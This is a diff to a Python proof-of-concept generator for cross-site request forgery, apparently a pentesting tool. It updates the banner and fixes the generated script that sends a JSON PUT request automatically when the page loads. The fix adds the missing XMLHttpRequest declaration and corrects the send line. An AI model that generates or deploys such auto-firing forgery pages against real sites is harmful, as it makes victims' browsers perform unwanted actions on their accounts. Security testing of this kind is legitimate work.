@@ -4,7 +4,7 @@
 #| | (__\__ \   / _|  |  _/ (_) | (__  | |\/| / _` | / / -_) '_|  |
 #|  \___|___/_|_\_|   |_|  \___/ \___| |_|  |_\__,_|_\_\___|_|    |
 #+----------------------------------------------------------------+
-#|                       Created by Shawar Khan - ShawarKhan.com  |
+#| A Simple & Handy Tool | Created by Shawar Khan - ShawarKhan.com|
 #+----------------------------------------------------------------+
 #
 #Information:  This is a tool specially designed for Pentesters  & 
@@ -46,7 +46,7 @@ print(" |  / __/ __| _ \ __| | _ \/ _ \ / __| |  \/  |__ _| |_____ _ _   |")
 print(" | | (__\__ \   / _|  |  _/ (_) | (__  | |\/| / _` | / / -_) '_|  |")
 print(" |  \___|___/_|_\_|   |_|  \___/ \___| |_|  |_\__,_|_\_\___|_|    |")
 print(" +----------------------------------------------------------------+")
-print(" |                       Created by Shawar Khan - ShawarKhan.com  |")
+print(" | A Simple & Handy Tool | Created by Shawar Khan - ShawarKhan.com|")
 print(" +----------------------------------------------------------------+")
 print("")
 print(" Information:  This is a tool specially designed for Pentesters  & ")
@@ -164,7 +164,7 @@ if method == "2": #GET Method
 if method == "3": #PUT(JSON)
 	actionurl = str(raw_input("[+] Enter full target URL(e.g, http://www.site.com/file.do): "))
 	exploittitle = "\n[+] Exploit:"
-	formstart = "\t<script>\n\tfunction put() {\n\tx.open(\"PUT\",\"" + actionurl + "\",true);\n\tx.setRequestHeader(\"Content-Type\", \"application/json\");"
+	formstart = "\t<script>\n\tfunction put() {\n\tvar x = new XMLHttpRequest();\n\tx.open(\"PUT\",\"" + actionurl + "\",true);\n\tx.setRequestHeader(\"Content-Type\", \"application/json\");"
 	formend = "\t}\n\t</script>\n\t<body onload=\"put()\">"
 
 	num = raw_input("Enter how many parameters you want to enter? :")
@@ -195,7 +195,7 @@ if method == "3": #PUT(JSON)
 
 		file.write(formstart)
 		file.write("\n")
-		file.write('{0}\n'.format("\tx.send(JSON.stringify(", finalstring , "\"));"))
+		file.write("\tx.send(JSON.stringify(%s));" % (finalstring))
 		file.write(formend)
 		file.close()
 		print("Your exploit is saved as %s")%filename
